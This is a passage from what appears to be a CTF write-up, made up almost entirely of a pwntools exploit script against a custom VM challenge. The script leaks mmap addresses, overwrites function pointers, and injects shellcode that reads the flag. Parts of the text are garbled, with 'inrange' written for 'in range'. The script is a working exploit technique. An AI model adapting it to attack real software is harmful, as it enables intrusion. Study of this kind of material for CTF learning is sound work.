  ope += pop_reg(1) # h16
ope += pop_reg(2)
ope += push_imm(read_ope & 0xffffffff)
ope += pop_reg(0) * 25

ope += push_reg(0)

io.sendafter(b"Please input your op:", ope)

for i inrange(340):
    ope = b""
    ope += pop_reg(0) + pop_reg(1) + pop_reg(2)
    ope += push_reg(0)
    io.send(ope)

    for j inrange(3):
        io.recvuntil(b"executed")

'''
reg1 : mmap_h
reg2 : mmap_l
ope = b""
ope += push_imm(0x100)
ope += pop_reg(3)
ope += imul(1, 1, 3) # 0x00????00

ope += write_data(0, 1, 0)
ope += show(0)

# part : leak heap address low 32 bits
# reg0 : 0xd0
# reg2 : low 32 bits
# reg3 : 0x10000
ope += sub(2, 2, 0)
ope += write_data(0, 2, 0)
ope += show(0)
'''

ope = b""
ope += push_imm(0x100)
ope += pop_reg(3)
ope += imul(1, 1, 3) # 0x00????00
ope += push_reg(0)
io.send(ope)
for j inrange(3):
    io.recvuntil(b"executed")

ope = b""
ope += write_data(0, 1, 0)
ope += show(0)
ope += push_reg(0)
io.send(ope)
for j inrange(3):
    io.recvuntil(b"executed")

io.recvuntil(b" is ")
hash_value = "0x" + io.recvuntil(b"n", drop=True).decode().rjust(8, "0")
mmap_h = int(hashtable[hash_value], 16) >> 8
log.success(f"mmap_h: {hex(mmap_h)}")

# part : pop
ope = b""
ope += push_reg(0)
io.send(ope)
sleep(0.5)

ope = b""
ope += write_data(0, 2, 0)
ope += show(0)
ope += push_reg(0)
io.send(ope)
for j inrange(1):
    io.recvuntil(b"executed")

io.recvuntil(b" is ")
hash_value = "0x" + io.recvuntil(b"n", drop=True).decode().rjust(8, "0")
mmap_l = int(hashtable[hash_value], 16) & 0xffffff00
log.success(f"mmap_l: {hex(mmap_l)}")

mmap_addr = mmap_h << 32 | mmap_l
log.success(f"mmap_addr: {hex(mmap_addr)}")

target_mmap_addr = mmap_addr - 0x221000
log.success(f"target_mmap_addr: {hex(target_mmap_addr)}")

for i inrange(301 + 47):
    ope = b""
    ope += push_imm(0x100) * 3
    ope += push_reg(0)
    io.send(ope)
    for i inrange(3):
        io.recvuntil(b"executed")

push_from_imm = elf_base + 0x1CD0
pop_to_reg = elf_base + 0x1D10

ope = b""
ope += push_imm(read_ope & 0xffffffff)
ope += push_imm((read_ope >> 32) & 0xffffffff)
ope += push_reg(0)
io.send(ope)
for i inrange(2):
    io.recvuntil(b"executed")

ope = b""
ope += push_imm(push_from_imm & 0xffffffff)
ope += push_imm((push_from_imm >> 32) & 0xffffffff)
ope += push_reg(0)
io.send(ope)
for i inrange(2):
    io.recvuntil(b"executed")

ope = b""
ope += push_imm(pop_to_reg & 0xffffffff)
ope += push_imm((pop_to_reg >> 32) & 0xffffffff)
ope += push_reg(0)
io.send(ope)
for i inrange(2):
    io.recvuntil(b"executed")

ope = b""
ope += push_imm(target_mmap_addr & 0xffffffff)
ope += push_imm((target_mmap_addr >> 32) & 0xffffffff)
ope += push_reg(0)
io.send(ope)
for i inrange(2):
    io.recvuntil(b"executed")

ope = b""
ope += push_imm(0xf3f06700)
ope += pop_reg(0)
ope += write_data(0, 0, 0)
ope += push_reg(0)
io.send(ope)
for i inrange(3):
    io.recvuntil(b"executed")

ope = b""
ope += push_imm(0xfff1e100)
ope += pop_reg(0)
ope += write_data(0, 0, 1)
ope += push_reg(0)
io.send(ope)
for i inrange(3):
    io.recvuntil(b"executed")

ope = b""
ope += push_imm(0xe96cc900)
ope += pop_reg(0)
ope += write_data(0, 0, 2)
ope += push_reg(0)
io.send(ope)
for i inrange(3):
    io.recvuntil(b"executed")

sleep(1)
ope = b""
ope += add(0, 0, 0)
io.send(ope)

sleep(1)

sc = asm(shellcraft.open("flag", 0) + shellcraft.sendfile(1, 3, 0, 0x50)).rjust(0x50, asm("nop"))
io.send(sc)

io.interactive()
```


---
## 附图

[图片已移除]